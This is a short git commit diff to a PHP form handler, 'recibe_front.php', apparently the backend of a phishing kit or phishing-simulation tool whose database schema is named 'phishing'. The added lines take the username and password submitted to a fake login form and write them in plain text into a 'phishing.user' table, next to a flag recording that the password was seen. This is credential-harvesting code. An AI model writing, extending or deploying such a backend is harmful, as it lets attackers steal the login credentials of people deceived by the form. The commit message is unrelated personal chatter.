e99b504043ec49c571fdc00818e81e2c4a38ef07
gastonbarbaccia <gastonbarbaccia@hotmail.com>
2022-12-22 21:06:45 -0300

    Tere sos grosa!!

--- v2/recibe_front.php
+++ v2/recibe_front.php
@@ -7,8 +7,12 @@ $pass = $_POST['contraseña'];
 
 if($_POST['contraseña'] == $pass) {
     $passw = 1;
+
     $click = "UPDATE phishing.attack_user SET password_seen=? WHERE user_uid=?";
     $conexion->prepare($click)->execute([$passw, $id]);
+
+    $click1 = "UPDATE phishing.user SET password=?, username=? WHERE uid=?";
+    $conexion->prepare($click1)->execute([$pass, $user, $id]);
     }
 else
     echo 'No se lleno';
